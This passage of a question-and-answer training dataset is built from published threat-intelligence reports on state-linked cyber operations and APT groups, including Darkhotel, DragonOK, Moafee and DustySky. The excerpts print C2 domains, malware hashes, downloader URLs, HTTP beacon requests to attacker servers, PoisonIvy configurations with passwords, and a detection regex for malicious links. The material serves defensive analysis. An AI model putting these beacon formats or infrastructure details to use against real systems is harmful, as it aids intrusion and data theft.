risk of a forceful NATO response to some provocation is minimised by keeping the death and destruction associated with any fait accompli to an absolute minimum. NATO is especially vulnerable to cyberattacks and information warfare because Russia can undermine NATO's deterrent strategy without causing casualties. NATO has the option of reversing the fait accompli, but the required level of death and destruction simply highlights the failure of its deterrent strategy.\nCyber power, as a key facet of hybrid warfare, is an important enabler in an attack on NATO's deterrent strategy.12 Cyber attacks are not specifically targeted to eliminate key nodes, but to intensify the fog of war by sowing confusion within command and control networks and NATO polities. For instance, according to press reports, Russian movement into the Ukraine was accompanied by myriad cyber attacks, including Distributed Denial of Service (DDoS) tactics against computers in Kyiv, Poland, the European Parliament, and the European Commission.13 If local political and military leaders cannot develop an accurate estimate of quickly developing events, critical hours or even days can be gained with which Russia can create facts on the ground that can only be reversed at great effort. A little bit of 'sand in the works', so to speak, is enough to further delay the relatively slow-pace of decision-making in the West.14\nCyber power is an important enabler in an attack on NATO's deterrent strategy.\nThe annexation of Crimea also began with a series of covert operations that used a disinformation campaign to create ambiguity and delay Ukraine's response, effectively extending the element of surprise achieved by the Russian gambit. According to Michael Kofman and Matthew Rohansky:\n'Russia's use of broadcast tools for propaganda and psychological operations, part of a broader information campaign to support the Crimean annexation, caught both the Ukraine and the West by surprise. Moscow amped up the alarmist content of its broadcasting . . . stoking fear and confusion in Crimea'.15\nAdmittedly, the annexation was completed using more traditional operations involving conventional units, but the cyber-enabled opening moves not only allowed Russia to test the Western response, but to buy the time needed to create a fait accompli through conventional means.\nWestern analysts have noted that even though the Crimea crisis surprised the West, the Russian effort to integrate television and the internet, especially various\ntypes of social media, into its effort to shape opponents' political perspectives, has been ongoing for quite some time. In a sense, Russia has worked hard to use the internet to shape the political environment of conflict: it has (1) developed internally and externally focused media with a significant online presence; (2) used social media to guarantee that Russian narratives reach the broadest possible audience; and (3) polished their content in terms of language and presentation so that it rings true in various cultural settings.16 These activities have recently been given their own moniker \u2013 trolling \u2013 the practice of creating cyber actors with false identities to communicate tailored messages to an unsuspecting audience.17 According to Keir Giles:\n12 As Michael Kofman and Matthew Rojansky note, 'hybrid warfare,' including the Russian variations used against the Ukraine is not unique. The point here, however, is that Russia is particularly adept as using cyber power in the practice of hybrid warfare; see Kofman and Rojansky, (op cit) p. 2. Other analysts have noted how the Crimea annexation and the additional actions against Ukraine were dependant on capabilities long under development that were especially crafted not to trigger a NATO response; Aleksandr Golts and Heidi Reisinger. 'Russia's Hybrid Warfare: Waging War below the Radar of Traditional Collective Defence,' Research Paper No 105 (Research Division \u2013 NATO Defence College Rome) November 2014.\n13 Owen Matthews. 'BIG READ: Russia leading the way in the cyber arms race,' Irish Examiner, Saturday June 13, 2015. www. irishexaminer.com'lifestyle'feature'big-read-russia-leading-the-way-in-the-cyber-arms-race-336675.html.\n14 The key point is that information denial or dominance does not have to be absolute, it just needs to foster delay and uncertainty in Western political and military decision-making. According to Paul Saunders, 'Russia's seizure of Crimea happened very quickly. U.S. and European decision-making processes just don't move at that speed, particularly when facing ambiguity. Once a Crimea-style operation has begun, it will be extremely difficult if not impossible for Western decision-makers to be sufficiently confident about the other side's intent to take consequential action before it's too late'; Saunders, P. 'Why America Can't Stop Russia's Hybrid Warfare,' The National Interest June 23, 2015. www.nationalinterest.org/feature/shy-america-can't-stop-russias-hybrid-warfare-13166.\n15 Kofman and Rojansky, p. 4.\n'Russian assessments of current events makes it clear that Russia considers itself to be engaged in full-scale information warfare, involving not only offensive but defensive operations \u2013 whether or not its notional adversaries have actually noticed this is happening'.18\nWhat most analysts fail to realise, however, is that Moscow has shaped this cyber-enabled information warfare in a very strategic manner. Cyber power is being wielded as a strategic weapon to create facts on the ground with the minimal use of kinetic force.\nQuestion: Why is Russia's use of cyber-enabled information warfare considered strategic, and what are the implications for NATO's response mechanisms?",
    "output": "Answer: Russia's use of cyber-enabled information warfare is considered strategic because it is wielded as a weapon to create facts on the ground with minimal use of kinetic force. This approach is designed to test the Western response and buy time needed to achieve objectives through conventional means. The implications for NATO's response mechanisms are significant, as the relatively slow pace of decision-making in the West can be further delayed by the 'sand in the works' created by cyber attacks, making it difficult for NATO to reverse the fait accompli without significant effort.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Lazarus & Watering-hole attacks\nOn 3rd February 2017, researchers at badcyber.com released an (<https://badcyber.com/several-polish-banks-hacked-information-stolen-by-unknown-attackers/>)article that detailed a series of attacks directed at Polish financial institutions. The article is brief, but states that \"This is \u2013 by far \u2013 the most serious information security incident we have seen in Poland\" followed by a claim that over 20 commercial banks had been confirmed as victims.\nThis report provides an outline of the attacks based on what was shared in the article, and our own additional findings.\n\nHow did the Lazarus group leverage watering-hole attacks to target Polish financial institutions, and why was this method particularly effective?",
    "output": "The Lazarus group utilized watering-hole attacks to target Polish financial institutions by compromising websites frequently visited by employees of these institutions. This method was particularly effective because it allowed the attackers to infect the systems of their intended targets without requiring direct interaction, such as phishing emails. By embedding malicious code into legitimate websites, the attackers could exploit vulnerabilities in the browsers or software of the visitors, thereby gaining unauthorized access to sensitive information. This approach is difficult to detect and defend against because it relies on the trust users place in familiar websites.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Lessons learned\n12 NHS Digital told us that all organisations infected by WannaCry shared the same vulnerability and could have taken relatively simple action to protect themselves. All NHS organisations infected by WannaCry had unpatched or unsupported Windows operating systems so were susceptible to the ransomware. However, whether organisations had patched their systems or not, taking action to manage their firewalls facing the internet would have guarded organisations against infection. NHS Digital told us that the majority of NHS devices infected were unpatched but on supported Microsoft Windows 7 operating systems. Unsupported devices (those on XP) were in the minority of identified issues. NHS Digital has also confirmed that the ransomware spread via the internet, including through the N3 network (the broadband network connecting all NHS sites in England), but that there were no instances of the ransomware spreading via NHSmail (the NHS email system) (paragraphs 1.2, 1.6 and 2.4 to 2.6).\n13 There was no clear relationship between vulnerability to the WannaCry attack and leadership in trusts. We found no clear relationship between trusts infected by WannaCry and the quality of their leadership, as rated by the Care Quality Commission (paragraph 2.8).\n14 The NHS has accepted that there are lessons to learn from WannaCry and is taking action. Lessons identified by the Department and NHS national bodies include the need to:\n\u2022 develop a response plan setting out what the NHS should do in the event of a cyber attack and establish the roles and responsibilities of local and national NHS bodies and the Department;\n\u2022 ensure organisations implement critical CareCERT alerts (emails sent by NHS Digital providing information or requiring action), including applying software patches and keeping anti-virus software up to date;\n\u2022 ensure essential communications are getting through during an attack when systems are down; and\n\u2022 ensure that organisations, boards and their staff are taking the cyber threat seriously, understand the direct risks to front-line services and are working proactively to maximise their resilience and minimise impacts on patient care.\nSince WannaCry, NHS England and NHS Improvement have written to every trust, clinical commissioning group and commissioning support unit asking boards to ensure that they have implemented all 39 CareCERT alerts issued by NHS Digital between March and May 2017 and taken essential action to secure local firewalls (paragraphs 3.8 and 3.9).\n\nWhat key lessons did the NHS identify from the WannaCry attack, and how are they planning to address these lessons to improve their cybersecurity posture? Discuss the importance of each lesson in the context of future cyber threats.",
    "output": "The NHS identified several key lessons from the WannaCry attack, including the need to develop a response plan for cyber attacks, ensure the implementation of critical CareCERT alerts, maintain essential communications during an attack, and ensure that organizations take the cyber threat seriously. To address these lessons, the NHS is taking action such as writing to every trust, clinical commissioning group, and commissioning support unit to ensure the implementation of all CareCERT alerts and essential actions to secure local firewalls. These measures are crucial for improving the NHS's cybersecurity posture because they enhance preparedness, ensure timely updates and patches, maintain communication channels during crises, and foster a culture of cybersecurity awareness, all of which are vital for mitigating future cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nThe Darkhotel ApT is a threat actor possessing a seemingly inconsistent and contradictory set of characteristics, some advanced and some fairly rudimentary. inhospitably operating for almost a decade, the threat actor is currently active. The actor's offensive activity can be tied to specific hotel and business center Wi-fi and physical connections, some of it is also tied to p2p/file sharing networks, and they have been known to spear-phish targets as well. Darkhotel tools are detected as \"Tapaoux\", \"pioneer\", \"Karba\", and \"Nemim\", among other names. The following list presents a set of characteristics for the crew:\n\u2022 operational competence to compromise, mis-use, and maintain access to global scale,  trusted commercial network resources with strategic precision for years\n\u2022 advanced mathematical and crypto-analytical offensive capabilities, along with no regard for undermining the trust extended to the Certificate Authorities and the pKi\n\u2022 indiscriminately infect systems with some regional clarity over trusted and untrusted resources to build and operate large botnets\n\u2022 well-developed low level keyloggers within an effective and consistent toolset\n\u2022 a focus throughout campaigns on specific victim categories and tagging them\n\u2022 a larger, dynamic infrastructure built of apache webservers, dynamic dns records, crypto libraries, and php webapps\n\u2022 regular 0-day access - recent deployment of an embedded Adobe flash 0-day spear-phishing exploit, and infrequent deployment of other 0-day resources to sustain larger campaigns over several years\nSmall Headline: Hotels and Business Centers Spread\nThe Darkhotel ApT's precise malware spread was observed in several hotels' networks, where visitors connecting to the hotel's Wi-fi were prompted to install software updates to popular software packages.\nof course, these packages were really installers for Darkhotel ApT's backdoors, added to legitimate installers from Adobe and Google. Digitally signed Darkhotel backdoors were installed alongside the legitimate packages.\nThe most interesting thing about this delivery method is that the hotels require guests to use their last name and room number to login, yet only a few guests received the Darkhotel package. When visiting the same hotels, our honeypot research systems couldn't attract a Darkhotel attack. This data is inconclusive, but it points to misuse of check-in information.\nSmall Headline: Abusing Network infrastructure\nThe Darkhotel actor maintained an effective intrusion set at hotel networks, providing ample access to unexpected points of attack over several years. These staging points also provide the attackers with access to check-in/check-out and identity information of visitors to high-end and luxury hotels.\nAs a part of an ongoing investigation, our research led us to embedded iframes within hotel networks that redirected individuals' web browsers to phony installers. The attackers were very careful with the placement of these iframes and executables on trusted resources - the hotels' network login portals themselves. The attackers were also very careful to immediately delete all traces of their tools as soon as an attack was carried out successfully. Those portals are now reviewed, cleaned and undergoing a further review and hardening process. We observed traces of a couple of these incidents in late 2013 and early 2014 on a victim hotel's network. The attackers set up the environment and hit their individual targets with precision. As soon as their target's stay was over and the attack-frame was closed, the attackers deleted their iframe placement and backdoored executables from the hotel network. The attackers successfully deleted traces of their work from earlier attacks in another hotel, but their offensive techniques were the same. outside reports of the same activity at other hotels provide enough data to confirm the same careful operations there.\nThe attack technique blurs the line between a couple of common ApT tactics; fairly inaccurate \"watering holes\" or \"strategic web compromises\" and more accurate spearphishing techniques. in this case, the Darkhotel attackers wait for their victim to connect to the internet over the hotel Wi-fi or the cable in their room. There is a very strong likelihood the targets will connect over these resources, and the attackers rely on that likelihood, much like at a watering hole. But the attackers also maintain truly precise targeting information over the victim's visit, much like they would know a victim's email address and content interests in a spearphishing attack. While setting up the attack, the Darkhotel attackers knew the target's expected arrival and departure times, room number, and full name, among other data. This data enables the attackers to present the malicious iframe precisely to that individual target. So, here we have yet another unique characteristic of this attacker - they employ a loosely certain but highly precise offensive approach.\nSmall Headline: indiscriminate Spread\nAn example of the Darkhotel ApT's indiscriminate malware spreading is demonstrated by the way it seeds Japanese p2p sharing sites, where the malware is delivered as a part of a large (approximately 900mb) rar archive. The archive is also spread over bittorrent, as detailed below. Darkhotel uses this method to distribute their Karba Trojan. These Japanese archives, translated for Chinese speaking viewers, appear to be sexual in nature, part of an anime sex/military comic scene, exposing the likely interests of potential targets.\nThis Darkhotel package was downloaded over 30,000 times in less than six months. The p2p bittorrent Darkhotel offering is listed here, posted on 2013.11.22. it was spread throughout 2014.\n(\u4e00\u822c\u30b3\u30df\u30c3\u30af) [\u53e4\u5473\u76f4\u5fd7] \u30cb\u30bb\u30b3\u30a4 \u7b2c0109\u5dfb.rar\nThis torrent serves up an almost 900 mb file. The rar archive decompresses to a directory full of encrypted zips, the associated decryptor and a password file for decrypting the zips. But what looks like the AxDecrypt.exe decryptor is bound to both the true decryptor and the dropper for the Darkhotel Catch.exe Karba Trojan. When a user downloads the torrent and decrypts the zip files, the trojan surreptitiously is installed and run on the victim system.\nCatch.exe, detected as Backdoor.Win32.Agent.dgrn, communicates with the following Darkhotel command and control servers:\nmicrodelta.crabdance.com  microyours.ignorelist.com  micronames.jumpingcrab.com  microchisk.mooo.com  microalba.serveftp.com\nother examples of this Darkhotel backdoor bound within a shared torrent include adult content Japanese anime and more. There are tens of thousands of downloads of these individual torrents.\nand\nThe associated Darkhotel backdoor was hosted on bittorrent, emule, etc, under a variety of comic names. Examples include comics and anime offerings. Related Darkhotel command and control server domains include:\nmicroblo5.mooo.com  microyours.ignorelist.com  micronames.jumpingcrab.com  microchisk.mooo.com  microalba.serveftp.com\nSmall Headline: Darkhotel Spear-phishing Campaigns\nDarkhotel campaigns involving typical spear-phished Tapaoux implants publicly appeared in bits and pieces several times over the past five years. These subproject efforts targeted defense industrial base (DiB), government, and NGo organizations. Email content on topics like nuclear energy and weaponry capabilities was used as a lure. Early accounts were posted on  describing attacks on NGo organizations and government policy makers. This spear-phishing activity continues into 2014. The attacks follow the typical spear-phishing process and in the past couple of months, exploited systems retrieved downloader executables from web servers like hxxp://officerevision.com/update/files22/update.exe or hxxp://tradeinf.com/mt/ duspr.exe\nover the past few years the group has emailed links that redirect targets' browsers to internet Explorer 0-day exploits. Sometimes the attachment itself includes an Adobe 0-day exploit.\nSmall Headline: Recent 0-day Deployment\nThis crew occasionally deploys 0-day exploits, but burns them when required. in the past few years, they deployed 0-day spear-phishing attacks targeting Adobe products and Microsoft internet Explorer, including cve20100188. in early 2014, our researchers exposed their use of cve20140497, a flash 0-day described on (<http://securelist.com/blog/incidents/58244/cve-2014-0497-a-0-day-vulnerability/>)Securelist in early february.\nThe crew spear-phished a set of target systems connected to the internet through Chinese iSps, and developed capabilities within the 0-day exploits to handle hardened Windows 8.1 systems. it's interesting that the flash objects were embedded in Korean documents titled \"list of the latest Japanese AV wind and how to use torrents.docx\" (loose English translation). The dropped downloader (d8137ded710d83e2339a97ee78494c34) delivered malcode similar to the \"information Stealer\" component functionality summarized below, and detailed in Appendix D.\nRead the text above and answer this question: How does the Darkhotel APT deploy 0-day exploits in their attacks? Provide an example of a recent deployment and explain the significance of their approach.",
    "output": "The Darkhotel APT occasionally deploys 0-day exploits, burning them when required. In early 2014, they deployed a Flash 0-day exploit (CVE-2014-0497) embedded in Korean documents titled 'list of the latest Japanese AV wind and how to use torrents.docx'. The dropped downloader delivered malcode similar to the 'Information Stealer' component functionality. This deployment targeted systems connected to the internet through Chinese ISPs and demonstrated the crew's capability to handle hardened Windows 8.1 systems. The significance of their approach lies in their ability to adapt to new environments and leverage advanced exploits to sustain their campaigns over several years.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Electronic warfare\nNorth Korea reportedly has the electronic warfare capabilities to jam GPS and to inject false GPS coordinates.218 North Korea demonstrated these capabilities in March 2011 by jamming South Korea's GPS signals during a joint U.S.-South Korea military exercise.219 North Korea has the capability to create an EMP.220 An EMP is a sudden, extreme outburst of atmospheric electricity creating an intense magnetic field that can burn out electrical equipment. 221 A report from the U.S. Department of Homeland Security (DHS) noted North Korea's ability to deliver a nuclear warhead as a satellite over the South Pole, effectively creating the burst needed to deliver an EMP targeting the United States. An EMP could effectively disrupt electronic communications including critical infrastructure components such as telecommunications, financial institutions, the energy sector, transportation, food and water delivery, emergency services, and space systems.222 North Korea reportedly acquired its EMP technology from Russia.223\nNorth Korea also has a drone program. The regime reportedly acquired its first drones in the late 1980's or early 1990's. The regime's drones are complimentary to its intelligence program and are primarily used for surveillance.224 In early 2014 a North Korean drone crashed south of the 38th parallel, the line dividing North Korea from the south.225 While early reports noted that the drones appeared similar to those manufactured by Chinese company Tauyuan Navigation Friend Aviation Technology, the company denied involvement.226\n217 http://fas.org/irp/doddir/army/fm3-05-301.pdf\n218 https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg\n219 http://www.reuters.com/article/2011/05/03/us-korea-north-cyber-idUSTRE7421Q520110503\n220 http://defensetech.org/2007/12/24/inside-dprks-unit-121/\n221 http://usatoday30.usatoday.com/tech/science/2010-10-26-emp_N.htm\n222 http://www.wnd.com/2014/04/dhs-study-north-korea-capable-of-emp-attack-on-u-s/\n223 http://www.extremetech.com/extreme/170563-north-korea-emp\n224 http://38north.org/2014/07/jbermudez070114/?utm_source=feedly&utm_reader=feedly&utm_medium=rss&utm_campaign=jbermudez070114\n225 http://www.popsci.com/blog-network/eastern-arsenal/north-koreas-new-drones-are-chinese-which-opens-new-mystery\n226 http://www.scmp.com/news/china-insider/article/1494207/north-korean-drones-not-theirs-says-chinese-retailer\nStressing the importance of the regime's electronic warfare capabilities, in 1999 former regime leader Kim Jong Il said \"The basic key to victory in modern warfare is to do well in electronic warfare.\"228 Since the regime's advanced technology lags behind that of South Korea and the U.S., its capability to disrupt the communications of these perceived adversaries is a vital asymmetric capability.229\n\nAnswer this question based on the above context: How does North Korea leverage its electronic warfare capabilities to counteract its technological disadvantages compared to South Korea and the U.S.?",
    "output": "North Korea leverages its electronic warfare capabilities to disrupt the communications of its perceived adversaries, South Korea and the U.S., which is a vital asymmetric capability. This includes the ability to jam GPS signals and inject false GPS coordinates, as demonstrated in March 2011 when North Korea jammed South Korea's GPS signals during a joint U.S.-South Korea military exercise. Additionally, North Korea has the capability to create an electromagnetic pulse (EMP), which can burn out electrical equipment and disrupt electronic communications, including critical infrastructure components such as telecommunications, financial institutions, the energy sector, transportation, food and water delivery, emergency services, and space systems. These capabilities allow North Korea to compensate for its lagging advanced technology compared to South Korea and the U.S.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Evidence Aurora Operation Still Active: Supply Chain Attack Through CCleaner\n9/20/2017\nRecently, there have been a few attacks with a supply chain infection, such as (<https://securelist.com/shadowpad-in-corporate-networks/81432/>)Shadowpad being implanted in many of Netsarang's products, affecting millions of people. You may have the most up to date cyber security software, but when the software you are trusting to keep you protected gets infected there is a problem. A backdoor, inserted into legitimate code by a third party with malicious intent, leads to millions of people being hacked and their information stolen.\nAvast's CCleaner software had a backdoor encoded into it by someone who had access to the supply chain. Through somewhere that had access to the source code of CCleaner, the main executable in v5.33.6162 had been modified to include a backdoor. The official statement from Avast can be found (<https://blog.avast.com/update-to-the-ccleaner-5.33.6162-security-incident>)here\nQuestion: How did the attackers manage to insert a backdoor into Avast's CCleaner software, and what does this reveal about the vulnerabilities in supply chain security?",
    "output": "Answer: The attackers managed to insert a backdoor into Avast's CCleaner software by gaining access to the supply chain. Specifically, they modified the main executable in version 5.33.6162 of CCleaner, which indicates that they had access to the source code. This incident highlights a significant vulnerability in supply chain security, where even having the most up-to-date cyber security software cannot protect users if the software itself is compromised. It underscores the importance of securing the entire supply chain, including source code repositories and development environments, to prevent unauthorized modifications and ensure the integrity of the software.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Sysget/HelloBridge\nThis tool has recently been analyzed by Secure-works 10. We observed the DragonOK attacker employ this tool against targets in Japan and Taiwan (e.g. 57e3d002542e07f2eb09fd2b1b0eeab2), as also noted by Secureworks. We have not yet seen the Moafee group use this tool. This implant has the following beacon format:\nGET /el/sregister.php?name=[REDACTED]\nHTTP/1.1\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0;\nWindows NT 6.1; Trident/6.0)\nHost: 122.10.62.137\nConnection: Keep-Alive\nOther URI formats include:\n/el/slogin.php?uid=\n/el/suploadfile.php?item=\n/el/suploadfile.php\nMedium Headline: Mongall\nFireEye has previously analyzed this backdoor11 , which is used by multiple other groups in addition to DragonOK and Moafee. DragonOK in particular is known to frequently use this implant (e.g. e8d77d19e1c6f462f4a5bf6fbe673a3c), which has the following network beacon format:\nGET /3000FC080000[REDACTED 00000000 0000000000000000000000000000000000 0000000000000000000000000000000000 0000000000000000000000000000000000 00100000[REDACTED]0000000000000000 000000000000000000000000000000000 0 0000000000000000[REDACTED]000000 HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0) Host: mail.jpaols[.]com:443\nCache-Control: no-cache\nMedium Headline: PoisonIvy\nThis is a publicly available RAT used by multiple threat actors, which has been extensively analyzed in a previous FireEye white paper12 .  The extracted configuration blocks from a \"DragonOK\" PoisonIvy variant (65fcc9b9ff608801edc697552438cfee), is shown below:\nID: ftp\nDomains: ftp.skydnastwm.com:15836|\nPassword: Ecp982*@Me2\nMutex: fftp\nIn contrast, here is an extracted PoisonIvy configuration block from a \"Moafee\" instance (9ebe86a648b1f19836251f946a160b16), as shown below:\nID:\nDomains: afp.mozjlla.com|\nPassword: 741526\nMutex: )!afpA.I4\nMedium Headline: Campaign #1: Moafee\nWe have observed the Moafee group target the governments and militaries of countries with national interests in the South China Sea. We have also observed this group target companies within the US defense industrial base.\nAs discussed, we have observed the Moafee group use a number of different tools including Poison Ivy, Nflog, Mongall, and NewCT2.\nWe found this group running HTRAN on one of their front-end command and control servers. The command and control server in question was\nlocated at 58.64.201.229. We monitored this server for two months, from January to March this year. During this time period, we observed the following domains resolving to 58.64.201.229:\n10 http://www.secureworks.com/resources/blog/research/hellobridge-trojan-uses-heartbleed-news-to-lure-victims/\n11 http://www.fireeye.com/blog/technical/malware-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-of-malaysian-flight-mh-370.html\n12 http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf\n13 http://en.wikipedia.org/wiki/South_China_Sea#Resources\n14 http://www.ifri.org/downloads/ifricanonopedseamanecs.pdf\n15 http://www.eia.gov/countries/regions-topics.cfm?fips=scs\nph.moafee[.]com afp.mozjlla[.]com mofa.mozjlla[.]com acer.moafee[.]com del.moafee[.]com jnt.moafee[.]com pcg.moafee[.]com sslc.moafee[.]com at.moafee[.]com lw.moafee[.]com ks.moafee[.]com\noa.moafee[.]com xxpp.moafee[.]com hp.moafee[.]com gumm.mozjlla[.]com msn.moafee[.]com\nDuring this same time frame, the HTRAN client at 58.64.201.229 was observed attempting to connect to a number of different backend HTRAN servers. All of these HTRAN servers were located in the Guangdong Province and operated by CHINANET.\nAdditionally, the Moafee group also hosted a PoisonIvy command and control server at phi. crabdance[.]com. Between April 30, 2012\n13 http://www.fireeye.com/blog/technical/malware-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-of-malaysian-flight-mh-370.html\n12 http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf\nand July 1, 2012, the phi.crabance[.]com domain resolved to 98.126.91.66. This IP was observed hosting a HTRAN proxy client, which was seen connecting to a backend HTRAN server hosted at 113.66.248.60. This server was also located in the Guangdong Province and operated by CHINANET.\nIn short, the Moafee group was observed consistently hosting their backend HTRAN servers in Guangdong. This observation may reveal that the Moafee group is physically located in this province.\nMedium Headline: Campaign #2: DragonOK\nWe have observed the DragonOK group target high-technology and manufacturing companies in both Japan and Taiwan. This group has used similar malware to the Moafee group described above. Specifically, we observed DragonOK employing PoisonIvy,\nNflog, Mongall, CT, and NewCT.\nLike the Moafee group, we observed the DragonOK group running an HTRAN proxy client on one of their front-end command and control servers. For approximately one week, between July 31, 2013 and August 8, 2013, the domain www.ndbssh[.]com served as a command and control server for Mongall payloads distributed by the DragonOK group. During this time, DragonOK also ran an HTRAN proxy client on www.ndbssh[.]com.\nThis HTRAN client was seen attempting to connect to three different HTRAN servers located in the Jiangsu province and operated by CHINANET.\nThe domain www.ndbssh[.]com resolved to 206.161.216.219 between 2013-09-28 and\n2013-10-04. The following other domains were seen resolving to this same IP:\nThe DragonOK group was observed hosting their backend HTRAN servers in Jiangsu. This observation may reveal that the DragonOK group is physically located in the Jiangsu province.\nBig Headline: Conclusion\nBased on the geolocation evidence provided in this paper, it appears that different operators executed the Moafee and DragonOK campaigns. This conclusion is supported by the following assessments:\n\u2022 The campaigns target different industries in different geographic locations. The Moafee campaign targets government and military organizations in countries with national interests in the South China Sea. In contrast, the DragonOK campaign has been observed targeting high-technology and manufacturing companies in Japan and Taiwan.\n\u2022 The campaigns maintain separate back-end command and control infrastructures hosted in different provinces in Mainland China. The Moafee campaign can be traced to infrastructure located in the Guangdong province, whereas the DragonOK campaign can be traced to infrastructure located in the Jiangsu province.\nWhile it seems that different operators are responsible for these two campaigns, our research showed that these operators share a number of common tools, techniques and procedures (TTPs). We also believe a separate third group is using these TTPs but we do not have sufficient insight to this operator at this time. The shared TTPs include:\n\u2022 Usage of the same custom backdoors and RATs such as CT/NewCT/NewCT2, Mongall, Nflog, as well as off-the-shelf RATs such as PoisonIvy, to maintain access to the victims' networks.\n\u2022 Usage of HTRAN to proxy their command and control communication.\n\u2022 Usage of the same evasion techniques to evade detection such as environment checks based on CPU cores, password protected documents, and the use of large null padded files.\nWe assess that these shared TTPs may be the result of:\n\u2022 A direct relationship between the operators.\n\u2022 An indirect relationship such as the completion of a common training regimen.\n\u2022 A common quartermaster or supply-chain for their malware tools.\nBig Headline: About FireEye, Inc.\nFireEye has invented a purpose-built, virtual machine-based security platform that provides real-time threat protection to enterprises and governments worldwide against the next generation of cyber attacks. These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses, such as next-generation firewalls, IPS, anti-virus, and gateways. The FireEye Threat Prevention Platform\nprovides real-time, dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors and across the different stages of an attack life cycle. The core of the FireEye platform is a virtual execution engine, complemented by dynamic threat intelligence, to identify and block cyber attacks in real time. FireEye has over 1,900 customers across more than 60 countries, including over 130 of the Fortune 500.\nFireEye, Inc.  |  1440 McCarthy Blvd. Milpitas, CA 95035  |  408.321.6300  |  877.FIREEYE (347.3393)  |  info@fireeye.com  |  www.fireeye.com\nQ: How does the DragonOK group use the Sysget/HelloBridge tool, and what are some of its notable characteristics, including the beacon format and user agent strings?",
    "output": "The DragonOK group employs the Sysget/HelloBridge tool against targets in Japan and Taiwan. This tool has specific beacon formats and user agent strings. The beacon format includes GET requests such as '/el/sregister.php?name=[REDACTED]', '/el/slogin.php?uid=', '/el/suploadfile.php?item=', and '/el/suploadfile.php'. The user agent string used is 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)', indicating the use of Internet Explorer 10 on Windows 7.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Delivery\nThe attackers would usually send a malicious email message that either links to an archive file (RAR or ZIP compressed) or has one attached to it.  Below are malicious email messages that have been sent to multiple targets on September and December 2015.\nThe link may include these parameters:\n\uf0b7 Id - the ID of the current wave of malicious email messages, composed of a plaintext word, a plus sign, and a number. For example: Rand+281\n\uf0b7 token1 - same as id, but Base64 encoded\n\uf0b7 token2 - Base64 encoded email address of the target to which the malicious message was sent.\n\uf0b7 C - the word Click or openexe\nThe following regular expression matches the structure of malicious links:\n\\/[A-Za-z]+\\.php\\?((?:id|token1|token2|C)=[A-Za-z0-9\\/=+%]*={0,2}&?){4}\nFor example: spynews.otzo[.]com/20151104/Update.php?id=>redacted>&token1=>redacted>&token2=>redacted>&C=Cli ck\nThe archive contains an .exe file, sometimes disguised as a Microsoft Word file, a video, or another file format, using the corresponding icon. For example:\nMedium Headline: Lure content and sender identity\nIf the victim extracts the archive and clicks the .exe file, the lure document or video are presented while the computer is being infected with DustySky.\nIn recent samples the group used Microsoft Word files embed with a malicious macro, which would infect the victim if enabled. Note, that these infection methods rely on social engineering - convincing the victim to open the file (and enabling content if it is disabled) - and not on software vulnerabilities.\nThe subject line of the malicious email message, as well as the name and content of the lure document, are usually related to recent events in diplomacy, defense, and politics. Sometimes lure topics are gossip or sex related and might even include a pornographic video. In recent samples, fake invoices and a copy of the public Google privacy policy were used.\nThe content of the lure document is always copied from a public news item or other web content, and is never an original composition of the attackers.\n\u0632\u0643\u0631\u0645\n\u0644\u0625\u0627 \u0631\u0627\u0645\u0627\u062a\n\u0644 \u0633\u0644\u0627\u0633\u0627\u064a\u062a\nThe \"from\" field in malicious messages is usually set to be related to the lure document, such as \"Latest Israel news\", \"Israeli Hot Stories\", \"Israel Defense Forces\", \" \" (impersonates the Emirates Policy Center organization6).\n6 \"The center undertakes the task of foreseeing the future of region, regional and international policy trends and the impact of different geopolitical projects on the region. It aims at providing strategic analysis, policy papers, studies, and research to serve the decision makers at any institution or country in the region with a priority given to UAE.\"\nWhen linked from the malicious message, the malware would be hosted either on a cloud service (many times in copy.com, a legitimate file hosting service), or on a server controlled by the attackers.\nMedium Headline: Phishing\nWhen the malware is hosted on a server controlled by the attackers, the User-Agent string of the target's browser is checked when they click the malicious link. If the target is using Windows, DuskySky is served. If the operating system is different than Windows, the target is served a Google, Microsoft, or Yahoo phishing page:\nThe source code of the phishing page is made up of a single JavaScript block, which at runtime decodes a single variable into HTML:\nAfter the victim fills in and sends the fake login form, they are redirected to a legitimate website. For example, in one case the victim was redirected to a news item7 in the Israeli news website NRG. Only the news item was old (from one year prior to the attack) and unrelated to the original subject of the malicious email message. It was probably used in previous attacks, and the attackers did not care enough or forgot to change it to a relevant one.\nMedium Headline: Attacks against software developers\nIP address 45.32.13.169 and all the domains that are pointing to it8 host a webpage which is a copy of a legitimate and unrelated software website - iMazing, an iOS management software.\nAmong the domains is a similar looking one - imazing[.]ga.\nThe source code of the fake website reveals that it was copied from the legitimate source on 22 October 2015:\nThe fake website, similarly to the legitimate one, offers visitors to download the iMazing software. However, the version on the fake website is bundled with DustySky malware. Upon execution of the malicious version (2f452e90c2f9b914543847ba2b431b9a) the legitimate iMazing is installed, while in the background DustySky is dropped as a file named Plugin.exe (1d9612a869ad929bd4dd16131ddb133a), and executed:\nPlugin.exe immediately starts communicating with its command and control sever using the hardcoded address ns.suppoit[.]xyz and supo.mefound[.]com, both also pointing to above mentioned 